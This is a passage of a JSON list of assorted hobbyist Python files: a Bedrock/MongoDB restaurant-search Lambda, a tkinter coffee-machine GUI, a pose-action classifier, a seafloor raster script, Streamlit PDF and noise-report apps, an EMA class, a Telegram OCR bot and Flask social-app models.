!= asset_id]\n    return asset\n",
    "import json\nimport boto3\nimport pymongo\nimport logging\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.INFO)\n\nsagemaker_runtime_client = boto3.client(\"sagemaker-runtime\")\n\ndef lambda_handler(event, context):\n    try:\n        # Extract the query parameter 'query' from the event\n        query_param = event.get('queryStringParameters', {}).get('query', '')\n\n        if query_param:\n            embedding = get_embedding(query_param)\n            search_results = perform_vector_search(embedding)\n\n            # Prompt the user for their feedback on the search results\n            user_prompt = f\"Here are the search results for the query '{query_param}':\\n\\n{json.dumps(search_results, indent=2)}\\n\\n If the results are relevant to user's query, write a recommendation with 'name' 'cuisines' 'address' 'aggregate_rating' 'latitude' 'longitude', also provide 'latitude' 'longitude' in separate variable. else provide apology for unavaialability of data.\"\n\n            # Invoke Claude 3 with the user prompt\n            claude_response = invoke_claude_3_with_text(user_prompt)\n\n            # Extract latitude and longitude from the search_quality_reflection\n            search_quality_reflection = claude_response.get('content', [])\n            if search_quality_reflection:\n                for output in search_quality_reflection:\n                    if 'latitude' in output and 'longitude' in output:\n                        latitude = output.get('latitude')\n                        longitude = output.get('longitude')\n                        print(f\"Latitude: {latitude}\")\n                        print(f\"Longitude: {longitude}\")\n                    else:\n                        print(\"Latitude and longitude not found in the search_quality_reflection.\")\n\n            return {\n                'statusCode': 200,\n                'body': json.dumps({\n                    'search_results': search_results,\n                    'search_quality_reflection': claude_response\n                })\n            }\n        else:\n            return {\n                'statusCode': 400,\n                'body': json.dumps({'error': 'No query parameter provided'})\n            }\n\n    except Exception as e:\n        return {\n            'statusCode': 500,\n            'body': json.dumps({'error': str(e)})\n        }\n\ndef get_embedding(synopsis):\n    input_data = {\"text_inputs\": synopsis}\n    response = sagemaker_runtime_client.invoke_endpoint(\n        EndpointName=\"SAGEMAKER_ENDPOINT_NAME\",\n        Body=json.dumps(input_data),\n        ContentType=\"application/json\"\n    )\n    result = json.loads(response[\"Body\"].read().decode())\n    embedding = result[\"embedding\"][0]\n    return embedding\n\ndef perform_vector_search(embedding):\n    # Connect to MongoDB Atlas\n    client = pymongo.MongoClient(\"MONGODB_URL\")\n\n    # Define pipeline for vector search\n    pipeline = [\n        {\n            '$vectorSearch': {\n                'index': 'vector_index',\n                'path': 'embedding',\n                'queryVector': embedding,\n                'numCandidates': 200,\n                'limit': 5\n            }\n        },\n        {\n            '$project': {\n                '_id': 0,\n                'name': 1,\n                'type': 1,\n                'cuisines': 1,\n                'highlights': 1,\n                'aggregate_rating': 1,\n                'latitude': 1,\n                'longitude': 1,\n                'address': 1,\n                'cuisine': 1,\n                'timings': 1,\n                'score': {\n                    '$meta': 'vectorSearchScore'\n                }\n            }\n        }\n    ]\n    \n    # Run the pipeline\n    result = client[\"zomato\"][\"restaurants\"].aggregate(pipeline)\n    \n    # Convert the result to a list of dictionaries\n    search_results = list(result)\n    \n    return search_results\n\ndef invoke_claude_3_with_text(prompt):\n    \"\"\"\n    Invokes Anthropic Claude 3 Sonnet to run an inference using the input\n    provided in the request body.\n\n    :param prompt: The prompt that you want Claude 3 to complete.\n    :return: Inference response from the model.\n    \"\"\"\n\n    # Initialize the Amazon Bedrock runtime client\n    client = boto3.client(\n        service_name=\"bedrock-runtime\", region_name=\"us-east-1\"\n    )\n\n    # Invoke Claude 3 with the text prompt\n    model_id = \"anthropic.claude-3-sonnet-20240229-v1:0\"\n\n    try:\n        response = client.invoke_model(\n            modelId=model_id,\n            body=json.dumps(\n                {\n                    \"anthropic_version\": \"bedrock-2023-05-31\",\n                    \"max_tokens\": 1024,\n                    \"messages\": [\n                        {\n                            \"role\": \"user\",\n                            \"content\": [{\"type\": \"text\", \"text\": prompt}],\n                        }\n                    ],\n                }\n            ),\n        )\n\n        # Process and print the response\n        result = json.loads(response.get(\"body\").read())\n        input_tokens = result[\"usage\"][\"inpu",
    "from tkinter import *\nfrom tkinter import messagebox\nfrom PIL import ImageTk, Image\nimport tkinter as tk\nimport speech_recognition as sr\nimport pyttsx3\n\n\ndef open_coffee_options():\n    # Hide the main menu buttons\n    button1.destroy()\n    button2.destroy()\n    button3.destroy()\n    \n    # Create a new frame for coffee options\n    coffee_frame = Frame(root)\n    coffee_frame.place(relx=0.5, rely=0.5, anchor=\"center\")\n    # define images\n    coffee_bg = PhotoImage(file=\"images/c-beans.png\")\n    # coffee options\n    cuppaccino = PhotoImage(file=\"images/cuppaccino.png\").subsample(3)\n    espresso = PhotoImage(file=\"images/espresso.png\").subsample(3)\n    latte = PhotoImage(file=\"images/latte.png\").subsample(3)\n    macch = PhotoImage(file=\"images/macch.png\").subsample(2)\n    mocha = PhotoImage(file=\"images/mocha.png\").subsample(3)\n    ameri = PhotoImage(file=\"images/ameri.png\").subsample(3)\n\n    # create a canvas\n    my_canvas2 = Canvas(coffee_frame, width=1600, height=900)\n    my_canvas2.pack(fill=\"both\", expand=True)\n\n    my_canvas2.create_image(0,0, image=coffee_bg, anchor=\"nw\")\n\n    # Add background image to the frame\n    def resized(e):\n        global coffee_bg, resized_coffee_bg, new_coffee_bg\n        # Open the image\n        coffee_bg = Image.open(\"images/c-beans.png\", )\n        # Resize the image\n        resized_coffee_bg = coffee_bg.resize((1600, 900), Image.LANCZOS)\n        # Define image again\n        new_coffee_bg = ImageTk.PhotoImage(resized_coffee_bg)\n        # Add it back to the canvas\n        my_canvas2.create_image(0,0, image=new_coffee_bg, anchor=\"nw\")\n        # Read the text\n        my_canvas2.create_text(400, 100, text=\"ArdaCiti Coffee Machine\", font=(\"Segoe Script\", 40))\n        my_canvas2.create_text(400, 150, text=\"Welcome!\", font=(\"Segoe Script\", 20))\n        # Add coffee options\n        my_canvas2.create_image(50,300, image=cuppaccino, anchor=\"nw\", tags=\"cuppaccino\")\n        my_canvas2.create_image(300,300, image=espresso, anchor=\"nw\", tags=\"espresso\")\n        my_canvas2.create_image(600,265, image=latte, anchor=\"nw\", tags=\"latte\")\n        my_canvas2.create_image(-25,550, image=macch, anchor=\"nw\", tags=\"macch\")\n        my_canvas2.create_image(330,550, image=mocha, anchor=\"nw\", tags=\"mocha\")\n        my_canvas2.create_image(550,550, image=ameri, anchor=\"nw\", tags=\"ameri\")\n        # Add text under each image\n        my_canvas2.create_text(70, 480, text=\"Cuppaccino\", font=(\"Arial\", 14), anchor=\"nw\")\n        my_canvas2.create_text(350, 480, text=\"Espresso\", font=(\"Arial\", 14), anchor=\"nw\")\n        my_canvas2.create_text(650, 480, text=\"Latte\", font=(\"Arial\", 14), anchor=\"nw\")\n        my_canvas2.create_text(90, 700, text=\"Macchiato\", font=(\"Arial\", 14), anchor=\"nw\")\n        my_canvas2.create_text(360, 700, text=\"Mocha\", font=(\"Arial\", 14), anchor=\"nw\")\n        my_canvas2.create_text(635, 700, text=\"Americano\", font=(\"Arial\", 14), anchor=\"nw\")\n\n    root.bind('<Configure>', resized)\n    \n    def on_click(event):\n        # get clicked item\n        item = event.widget.find_closest(event.x, event.y)[0]\n        \n        if \"cuppaccino\" in my_canvas2.gettags(item):\n            messagebox.showinfo(\"Cuppaccino Clicked\", \"You clicked on Cuppaccino!\")\n        elif \"espresso\" in my_canvas2.gettags(item):\n            print(\"espresson clicked\")\n            customize_coffee()\n        elif \"latte\" in my_canvas2.gettags(item):\n            print(\"Latte clicked\")\n            customize_coffee()\n        elif \"macch\" in my_canvas2.gettags(item):\n            print(\"Macchiato clicked\")\n            customize_coffee()\n        elif \"mocha\" in my_canvas2.gettags(item):\n            print(\"Mocha clicked\")\n            customize_coffee()\n        elif 'ameri' in my_canvas2.gettags(item):\n            print(\"Americano clicked\")\n            customize_coffee()\n\n    my_canvas2.bind(\"<Button-1>\", on_click)\n\ndef open_tea_options():\n    # Hide the main menu buttons\n    button1.destroy()\n    button2.destroy()\n    button3.destroy()\n    \n    my_tea = Button(root,text=\"Back\").pack()\n    # Create a new frame for coffee options\n    tea_frame = Frame(root)\n    tea_frame.place(relx=0.5, rely=0.5, anchor=\"center\")\n    # define images\n    tea_bg = PhotoImage(file=\"images/tea.png\") # background image\n    # tea options\n    rooibos = PhotoImage(file=\"images/rooibos.png\").subsample(3)\n    peppermint = PhotoImage(file=\"images/peppermint.png\").subsample(3)\n    greentea = PhotoImage(file=\"images/greentea.png\").subsample(3)\n    cinnamon = PhotoImage(file=\"images/cinnamon.png\").subsample(3)\n    chamomile = PhotoImage(file=\"images/chamomile.png\").subsample(2)\n    ceylon = PhotoImage(file=\"images/ceylon.png\")\n    \n    \n    # create a canvas\n    my_canvas3 = Canvas(tea_frame, width=1600, height=900)\n    my_canvas3.pack(fill=\"both\", expand=True)\n\n    my_canvas3.create_image(0,0, image=tea_bg, anchor=\"nw\")\n    \n    def resized(e):\n        global tea_bg, resized_tea_bg, new_tea_bg\n        # Open the image\n        tea_bg = Image.open(\"images/tea.png\")\n        #",
    "import cv2\nimport mediapipe as mp\nimport os\nimport pandas as pd\nimport numpy as np\nimport tensorflow as tf\nfrom keras.models import load_model\nimport threading\n\nphysical_devices = tf.config.experimental.list_physical_devices('GPU')\nif len(physical_devices) > 0:\n    tf.config.experimental.set_visible_devices(physical_devices[0], 'GPU')\n\nnum_of_timesteps = 7\nmodel = load_model(f'model/model_{num_of_timesteps}.h5')\n\nmpPose = mp.solutions.pose\npose = mpPose.Pose()\nmpDraw = mp.solutions.drawing_utils\n\n\ndef make_landmark_timestep(results):\n    lm_list = []\n    landmarks = results.pose_landmarks.landmark\n    \n    base_x = landmarks[0].x\n    base_y = landmarks[0].y\n    base_z = landmarks[0].z\n    \n    center_x = np.mean([lm.x for lm in landmarks])\n    center_y = np.mean([lm.y for lm in landmarks])\n    center_z = np.mean([lm.z for lm in landmarks])\n\n    distances = [np.sqrt((lm.x - center_x)**2 + (lm.y - center_y)**2 + (lm.z - center_z)**2) for lm in landmarks[1:]]\n\n    scale_factors = [1.0 / dist for dist in distances]\n\n    lm_list.append(0.0)\n    lm_list.append(0.0)\n    lm_list.append(0.0)\n    lm_list.append(landmarks[0].visibility)\n\n    for lm, scale_factor in zip(landmarks[1:], scale_factors):\n        lm_list.append((lm.x - base_x) * scale_factor)\n        lm_list.append((lm.y - base_y) * scale_factor)\n        lm_list.append((lm.z - base_z) * scale_factor)\n        lm_list.append(lm.visibility)\n    return lm_list\n\ndef draw_landmark_on_image(results, img):\n    mpDraw.draw_landmarks(img, results.pose_landmarks, mpPose.POSE_CONNECTIONS)\n    h, w, c = img.shape\n    bbox = []\n    if results.pose_landmarks:\n        for id, lm in enumerate(results.pose_landmarks.landmark):\n            cx, cy = int(lm.x * w), int(lm.y * h)\n            bbox.append([cx, cy])\n        x_min, y_min = np.min(bbox, axis=0)\n        x_max, y_max = np.max(bbox, axis=0)\n        cv2.rectangle(img, (x_min, y_min), (x_max, y_max), (0, 255, 0), 2)\n    return img\n\ndef draw_class_on_image(label, img):\n    font = cv2.FONT_HERSHEY_SIMPLEX\n    bottomLeftCornerOfText = (20, 50)\n    fontScale = 1\n    fontColor = (0, 255, 0)\n    thickness = 2\n    lineType = 2\n    cv2.putText(img, label,\n                bottomLeftCornerOfText,\n                font,\n                fontScale,\n                fontColor,\n                thickness,\n                lineType)\n    return img\n\nlabel = \"Unknown\"\n\ndef detect(model, lm_list):\n    global label\n    lm_list = np.array(lm_list)\n    lm_list = np.expand_dims(lm_list, axis=0)\n    results = model.predict(lm_list)\n    predicted_label_index = np.argmax(results, axis=1)[0]\n    classes = ['boxing', 'handclapping', 'handwaving', 'jogging', 'running', 'walking']\n    confidence = np.max(results, axis=1)[0]\n    if confidence > 0.95:\n        label = classes[predicted_label_index]\n    else:\n        label = \"neutral\"\n\n\ncap = cv2.VideoCapture(0)\ncap.set(3, 1280)\ncap.set(4, 720)\n\nlm_list = []\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret:\n        break\n    frameRGB = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n    results = pose.process(frameRGB)\n    if results.pose_landmarks:\n        lm = make_landmark_timestep(results)\n        lm_list.append(lm)\n        if len(lm_list) == num_of_timesteps:\n            detect_thread = threading.Thread(target=detect, args=(model, lm_list,))\n            detect_thread.start()\n            lm_list = []\n        frame = draw_landmark_on_image(results, frame)\n    # frame = cv2.flip(frame, 1)\n    frame = draw_class_on_image(label, frame)\n    cv2.imshow(\"image\", frame)\n    if cv2.waitKey(1) == ord('q'):\n        break\n    \ncap.release()\ncv2.destroyAllWindows()\n",
    "import os\nimport rasterio\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport fiona\nimport tempfile\nimport geopandas as gpd\nfrom rasterio.mask import mask\nfrom rasterio.crs import CRS\nfrom rasterio.windows import Window\nfrom rasterio.enums import Resampling\nfrom rasterio.warp import reproject, Resampling\nfrom rasterio.fill import fillnodata\nfrom tqdm import tqdm\nfrom PIL import Image  # Import Pillow library\nfrom rasterio import MemoryFile\nfrom scipy import interpolate\n\n# TIFF\ntiff = r'C:\\Users\\jakem\\source\\repos\\seafloor-mapping\\data\\BS_composite_10m.tif'\n# Bathymetry tiff\nbathy = r'C:\\Users\\jakem\\source\\repos\\seafloor-mapping\\data\\Nahant_NH_bathy.tif'\n# Shapefile\nshape = r'C:\\Users\\jakem\\source\\repos\\seafloor-mapping\\data\\Nahant_NH_sedcover.shp'\n# Output directory\noutput_dir = r'C:\\Users\\jakem\\source\\repos\\seafloor-mapping\\output'\n\n# Generate a temporary file path\ntemp_file_path = tempfile.NamedTemporaryFile(suffix='.tif').name\n\ntry:\n    # Open TIFF raster\n    with rasterio.open(tiff) as src:\n        # Read raster bounds\n        bands = src.read()\n        print(bands.shape)\n        raster_bounds = src.bounds\n\n        \n\n        # Check if raster bounds are empty\n        if not raster_bounds:\n            print(\"Raster bounds are empty. Check if the raster file is valid.\")\n        else:\n            print(\"Raster bounds:\", raster_bounds)\n\n            # Open shapefile\n            gdf = gpd.read_file(shape)\n            \n            # Set CRS for GeoDataFrame\n            gdf.crs = CRS.from_epsg(4326)  # Assuming EPSG code for the CRS\n            \n            # Reproject to raster CRS\n            gdf = gdf.to_crs(src.crs)\n\n            # Clip to raster extent\n            gdf_clipped = gdf.cx[raster_bounds.left:raster_bounds.right, raster_bounds.bottom:raster_bounds.top]\n\n            # Extract shapes\n            shapes = gdf_clipped['geometry']\n\n                                # Check if shapes list is empty\n            if shapes.empty:\n                print(\"No valid geometries found in the shapefile.\")\n            else:\n                        # Mask the raster using the clipped shapefile geometries\n                out_image, out_transform = mask(src, shapes, invert=False)\n                out_meta = src.meta\n\n\n            with rasterio.open(bathy) as bathy_src:\n                \n\n                # Reproject bathymetry raster to match the CRS and extent of the TIFF raster\n                reprojected_bathy = np.zeros((src.shape), dtype=bathy_src.meta['dtype'])\n\n                reproject(\n                    bathy_src.read(),  # Source data\n                    reprojected_bathy,  # Output buffer\n                    src_transform=bathy_src.transform,  # Source transform\n                    src_crs=bathy_src.crs,  # Source CRS\n                    dst_transform=src.transform,  # Destination transform\n                    dst_crs=src.crs,  # Destination CRS\n                    resampling=Resampling.bilinear  # Resampling method\n                )\n                braster_bounds = src.bounds\n                # Check if raster bounds are empty\n                if not braster_bounds:\n                    print(\"Raster bounds are empty. Check if the raster file is valid.\")\n                else:\n                    print(\"Raster bounds:\", braster_bounds)\n                    #print(src.crs)\n                    # Open shapefile\n                    gdf = gpd.read_file(shape)\n                    \n                    # Set CRS for GeoDataFrame\n                    gdf.crs = CRS.from_epsg(4326)  # Assuming EPSG code for the CRS\n                    \n                    # Reproject to raster CRS\n                    gdf = gdf.to_crs(src.crs)\n\n                    # Clip to raster extent\n                    gdf_clipped = gdf.cx[braster_bounds.left:braster_bounds.right, braster_bounds.bottom:braster_bounds.top]\n\n                    # Extract shapes\n                    shapes = gdf_clipped['geometry']\n\n                    with rasterio.Env(CHECK_DISK_FREE_SPACE=\"NO\"):\n                        with MemoryFile() as memfile:\n                            with memfile.open(driver='GTiff', width=src.width, height=src.height, count=1,\n                                            dtype=reprojected_bathy.dtype, crs=src.crs, transform=src.transform) as dataset:\n                                dataset.write(reprojected_bathy,1)\n                        # Mask the bathymetry raster with the shapefile geometries\n                                bout_image, bout_transform = mask(dataset, shapes, invert=False)\n                                bout_meta = src.meta\n\n                    # Append bathymetry band to the main raster bands\n                    min_value = np.amin(bout_image)\n                    max_value = np.amax(bout_image)\n\n                    print(\"Minimum value of bout_image:\", min_value)\n                    print(\"Maximum value of bout_image:\", max_value)\n\n\n                    #interpolate missing values in bathymetry\n                    bout_i",
    "import streamlit as st\nfrom PyPDF2 import PdfReader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nimport os\nfrom langchain_google_genai import GoogleGenerativeAIEmbeddings\nimport google.generativeai as genai\nfrom langchain.vectorstores import FAISS\nfrom langchain_google_genai import ChatGoogleGenerativeAI\nfrom langchain.chains.question_answering import load_qa_chain\nfrom langchain.prompts import PromptTemplate\nfrom dotenv import load_dotenv\n\ngenai.configure(api_key=os.getenv(\"GOOGLE_API_KEY\"))\n\n\ndef get_pdf_text(pdf_docs):\n    text=\"\"\n    for pdf in pdf_docs:\n        pdf_reader= PdfReader(pdf)\n        for page in pdf_reader.pages:\n            text+= page.extract_text()\n    return  text\n\n\n\ndef get_text_chunks(text):\n    text_splitter = RecursiveCharacterTextSplitter(chunk_size=10000, chunk_overlap=1000)\n    chunks = text_splitter.split_text(text)\n    return chunks\n\n\ndef get_vector_store(text_chunks):\n    embeddings = GoogleGenerativeAIEmbeddings(model = \"models/embedding-001\")\n    vector_store = FAISS.from_texts(text_chunks, embedding=embeddings)\n    vector_store.save_local(\"faiss_index\")\n\n\ndef get_conversational_chain():\n\n    prompt_template = \"\"\"\n    Answer the question as detailed as possible from the provided context, make sure to provide all the details, if the answer is not in\n    provided context just say, \"answer is not available in the context\", don't provide the wrong answer\\n\\n\n    Context:\\n {context}?\\n\n    Question: \\n{question}\\n\n\n    Answer:\n    \"\"\"\n\n    model = ChatGoogleGenerativeAI(model=\"gemini-pro\",\n                             temperature=0.1)\n\n    prompt = PromptTemplate(template = prompt_template, input_variables = [\"context\", \"question\"])\n    chain = load_qa_chain(model, chain_type=\"stuff\", prompt=prompt)\n\n    return chain\n\n\n\ndef user_input(user_question):\n    embeddings = GoogleGenerativeAIEmbeddings(model = \"models/embedding-001\")\n    \n    new_db = FAISS.load_local(\"faiss_index\", embeddings,allow_dangerous_deserialization= True)\n    docs = new_db.similarity_search(user_question)\n\n    chain = get_conversational_chain()\n\n    \n    response = chain(\n        {\"input_documents\":docs, \"question\": user_question}\n        , return_only_outputs=True)\n\n    print(response)\n    st.write(\"Reply: \", response[\"output_text\"])\n\n\n\n\ndef main():\n    st.set_page_config(\"Chat PDF\")\n    st.header(\"QnA with Multiple PDF files\ud83d\udc81\")\n\n    user_question = st.text_input(\"Ask a Question from the PDF Files\")\n\n    if user_question:\n        user_input(user_question)\n\n    with st.sidebar:\n        st.title(\"Menu:\")\n        pdf_docs = st.file_uploader(\"Upload your PDF Files and Click on the Submit & Process Button\", accept_multiple_files=True)\n        if st.button(\"Submit & Process\"):\n            with st.spinner(\"Processing...\"):\n                raw_text = get_pdf_text(pdf_docs)\n                text_chunks = get_text_chunks(raw_text)\n                get_vector_store(text_chunks)\n                st.success(\"Done\")\n\n\n\nif __name__ == \"__main__\":\n    main()",
    "import copy\nimport itertools\n\nimport torch\nfrom torch import nn\n\n\ndef params_buffers(m: nn.Module):\n    return itertools.chain(m.parameters(), m.buffers())\n\n\nclass EMA(nn.Module):\n    def __init__(\n        self,\n        model: nn.Module,\n        warmup_steps: int = 100,\n        update_interval: int = 10,\n        beta: float = 0.999,\n    ) -> None:\n        super().__init__()\n        self.ema_model = copy.deepcopy(model)\n        self.model = [model]  # not included in state dict\n        self.warmup_steps = warmup_steps\n        self.update_interval = update_interval\n        self.beta = beta\n\n    @torch.no_grad()\n    def update(self, step: int) -> None:\n        if step < self.warmup_steps or (step - self.warmup_steps) % self.update_interval:\n            return\n\n        if step == self.warmup_steps:\n            for ema_p, p in zip(params_buffers(self.ema_model), params_buffers(self.model[0])):\n                ema_p.copy_(p)\n            return\n\n        for ema_p, p in zip(params_buffers(self.ema_model), params_buffers(self.model[0])):\n            if ema_p.is_floating_point():\n                ema_p.lerp_(p, 1.0 - self.beta)\n            else:\n                ema_p.copy_(p)\n\n    @torch.no_grad()\n    def forward(self, *args, **kwargs):\n        return self.ema_model(*args, **kwargs)\n\n    def state_dict(self):\n        return self.ema_model.state_dict()\n\n    def load_state_dict(self, state_dict, strict: bool = True, assign: bool = False):\n        return self.ema_model.load_state_dict(state_dict, strict, assign)\n",
    "import pytesseract\nimport re\nimport telebot\nfrom telebot import types\nfrom datetime import datetime, timedelta\n\n\ntg_bot = telebot.TeleBot(os.getenv('TG_BOT_TOKEN'))\ntg_group = os.getenv('TG_GROUP_ID')\n\n@tl_bot.message_handler(func=lambda message: message.chat.id == group_id_to_listen, content_types=['text', 'photo'])    \ndef handle_message(message):\n    # Create a markup with Yes and No buttons\n    markup = types.InlineKeyboardMarkup()\n    yes_button = types.InlineKeyboardButton(text=\"Yes\", callback_data=\"yes\")\n    no_button = types.InlineKeyboardButton(text=\"No\", callback_data=\"no\")\n    markup.add(yes_button, no_button)\n    \n    if message.chat.type == 'photo':\n        result = time_from_photo(message.photo[-1])\n        # Send a confirmation message with the markup\n        tg_bot.send_message(message.chat.id, f\"Is {result} it correct?\", reply_markup=markup)\n    elif contains_time(message.text):\n        # check if it's time data\n        # saves it\n        # Otherwise continue\n        pass\n    else:\n        tl_bot.send_message(message.chat.id, \"I don't understand it.\")\n        ask_for_confirmation(message)\n\n@tg_bot.callback_query_handler(func=lambda call: True)\ndef handle_callback_query(call):\n    if call.data == \"yes\":\n        # Save the data\n        # save_to_sheets(data)\n        # Edit message accordingly\n        tg_bot.answer_callback_query(call.id, \"Success! \u2705\")\n        tg_bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=\"Success! \u2705\", reply_markup=None)\n    else:\n        # Ask again?\n        tg_bot.answer_callback_query(call.id, \"Please send the data again\")\n        tg_bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=\"Please send the data again\", reply_markup=None)\n# Runs bot forever\ntg_bot.polling()\n\ndef elapsed_time(times_list):\n    total_seconds = 0\n    for i in range(0, len(times_list)-1, 2):\n        # Convert time strings to datetime objects\n        time1 = datetime.strptime(times_list[i], \"%H:%M\")\n        time2 = datetime.strptime(times_list[i+1], \"%H:%M\")\n        # Calculate time difference between the consecutive times\n        time_difference = time2 - time1\n        # Add time difference to total_seconds\n        total_seconds += time_difference.total_seconds()\n    # Convert total_seconds to HH:mm format\n    hours = int(total_seconds // 3600)\n    minutes = int((total_seconds % 3600) // 60)\n    return \"{:02d}:{:02d}\".format(hours, minutes)\n\n\ndef save_to_sheets(data):\n    pass\n\ndef special_cases():\n    # For special days, when manual editing will be required\n    pass\n\ndef time_from_photo(img_obj):\n    # Open the image file\n    image = Image.open(img_obj)\n    # Extract text from the image\n    text = pytesseract.image_to_string(image)\n    # Look for time pattern (hh:mm)\n    time_pattern = re.compile(r'\\b([01]?[0-9]|2[0-3]):[0-5][0-9]\\b')\n    matches = time_pattern.findall(text)\n    return matches\n",
    "from flask_login import UserMixin\nfrom flask_sqlalchemy import SQLAlchemy\n\ndb = SQLAlchemy()\n\nclass User(UserMixin, db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(80), unique=True, nullable=False)\n    email = db.Column(db.String(120), unique=True, nullable=False)\n    password = db.Column(db.String(255), nullable=False)\n    profile_picture = db.Column(db.String(255), nullable=True)\n    posts = db.relationship('Post', backref='author', lazy=True)\n    role = db.Column(db.Integer, db.ForeignKey('role.id'))\n    \n    following = db.relationship(\n        'Follow',\n        foreign_keys='Follow.follower_id',\n        lazy=True,\n        cascade='all, delete-orphan'\n    )\n\n    followers = db.relationship(\n        'Follow',\n        foreign_keys='Follow.followed_id',\n        lazy=True,\n        cascade='all, delete-orphan'\n    )\n    def follow(self, user):\n        if not self.is_following(user):\n            follow = Follow(follower=self, followed=user)\n            db.session.add(follow)\n\n    def unfollow(self, user):\n        follow = self.followings.filter_by(followed_id=user.id).first()\n        if follow:\n            db.session.delete(follow)\n\n    def is_following(self, user):\n        return self.following.filter_by(followed_id=user.id).first() is not None\n\n    def count_following(self):\n        return len(self.following)\n\n    def count_followers(self):\n        return len(self.followers)\n    \n    def count_likes_received(self):\n        return sum(post.count_likes() for post in self.posts)\n\nclass Role(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    name = db.Column(db.String(80), unique=True, nullable=False)\n    permissions = db.relationship('Permission', backref='role', lazy=True)\n\nclass Permission(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    name = db.Column(db.String(80), unique=True, nullable=False)\n    role_id = db.Column(db.Integer, db.ForeignKey('role.id'), nullable=False)\n\n\nclass Post(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    content = db.Column(db.Text, nullable=False)\n    image = db.Column(db.String(255), nullable=True)\n    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))\n    likes = db.relationship('Liked_Post', backref='post', lazy=True, cascade='all, delete-orphan')\n    comments = db.relationship('Comment', backref='post', lazy=True, cascade='all, delete-orphan')\n    \n    def count_likes(self):\n        return len(self.likes)\n    def to_json(self):\n        return {\n            'id': self.id,\n            'content': self.content,\n            'image': self.image,\n            'user_id': self.user_id,\n            'likes': self.likes,\n            'comments': self.comments\n        }\n\n    def __repr__(self):\n        return f'<Post {self.id}>'\n    \n    \nclass Follow(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    follower_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n    followed_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n\n\nclass Liked_Post(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n    post_id = db.Column(db.Integer, db.ForeignKey('post.id'), nullable=False)\n    is_like = db.Column(db.Boolean, default=False)\n\n\n    def to_json(self):\n        return {\n            'post_id': self.post_id\n        }\n\n    def __repr__(self):\n        return f'<Like {self.id}>'\n\n\nclass Comment(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n    post_id = db.Column(db.Integer, db.ForeignKey('post.id'), nullable=False)\n    content = db.Column(db.Text, nullable=False)\n    \n    def to_json(self):\n        return {\n            'content': self.content,\n        }\n    \n    def __repr__(self):\n        return f'<Comment {self.id}>' \n    \nclass Message(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    sender_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n    recipient_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n    content = db.Column(db.Text, nullable=False)",
    "import streamlit as st\r\nimport pandas as pd\r\nfrom datetime import datetime\r\nimport pyaudio\r\nimport numpy as np\r\nimport time\r\nimport os\r\nimport requests\r\nfrom openai import OpenAI\r\n\r\nclient = OpenAI(api_key=\"Your API key\")\r\n# Create a wrapper function to get OpenAI completion\r\ndef get_completion(prompt, model=\"gpt-3.5-turbo\"):\r\n    completion = client.chat.completions.create(\r\n        model=model,\r\n        messages=[\r\n        {\"role\": \"system\", \"content\": 'You are a helpful chatbot. Thank the user for their report, then provide a suggestion based on their prompt. Provide link to their local authority. Finally, including this at the end \"Still have questions? Please click the \"Chat\" button below.\"'},\r\n        {\"role\": \"user\", \"content\": prompt},\r\n        ]\r\n    )\r\n    return completion.choices[0].message.content\r\n\r\n#Calculate a dB level from audio data\r\ndef calculate_dbs(data, sample_rate):\r\n    rms = np.sqrt(np.mean(data ** 2))\r\n    db_level = 20 * np.log10(rms)\r\n    return db_level\r\n#Record audio using PyAudio\r\ndef record_audio(duration=5, sample_rate=44100, channels=1, format=pyaudio.paInt16):\r\n    p = pyaudio.PyAudio()\r\n    stream = p.open(format=format,\r\n                    channels=channels,\r\n                    rate=sample_rate,\r\n                    input=True,\r\n                    frames_per_buffer=1024)\r\n\r\n    frames = []\r\n    for i in range(0, int(sample_rate / 1024 * duration)):\r\n        data = stream.read(1024)\r\n        frames.append(data)\r\n        time.sleep(0.1)  # Reduce sleep time to keep UI responsive\r\n\r\n    stream.stop_stream()\r\n    stream.close()\r\n    p.terminate()\r\n\r\n    audio_data = b''.join(frames)\r\n    audio_array = np.frombuffer(audio_data, dtype=np.int16)\r\n    db_level = calculate_dbs(audio_array, sample_rate)\r\n\r\n    return db_level\r\n\r\ndef append_to_csv(data_list, filename=\"noise_data.csv\"):\r\n    # Check if the file exists and is not empty\r\n    if not os.path.isfile(filename) or os.stat(filename).st_size == 0:\r\n        # If file doesn't exist or is empty, write with header and starting 'Entry' from 1\r\n        with open(filename, 'w', newline='') as f:  # Ensure correct line handling on Windows\r\n            pd.DataFrame([{'Entry': i + 1, **data} for i, data in enumerate(data_list)]).to_csv(f, index=False)\r\n    else:\r\n        # If file exists, read the current data to find the last 'Entry' number\r\n        current_df = pd.read_csv(filename)\r\n        max_entry = current_df['Entry'].max() if 'Entry' in current_df.columns else 0\r\n        # Append new data with incremented 'Entry' numbers\r\n        with open(filename, 'a', newline='') as f:  # Append mode, ensure correct line handling on Windows\r\n            pd.DataFrame([{'Entry': max_entry + i + 1, **data} for i, data in enumerate(data_list)]).to_csv(f, header=False, index=False)\r\n\r\ndef get_location():\r\n    try:\r\n        response = requests.get('https://ipinfo.io/json')\r\n        data = response.json()\r\n        location = data.get('city') + ', ' + data.get('region') + ', ' + data.get('country')\r\n        return location\r\n    except Exception as e:\r\n        st.error(f\"Error retrieving location: {e}\")\r\n        return None\r\n\r\ndef main():\r\n    \r\n    \r\n    # Initialize agreement status in session state if not 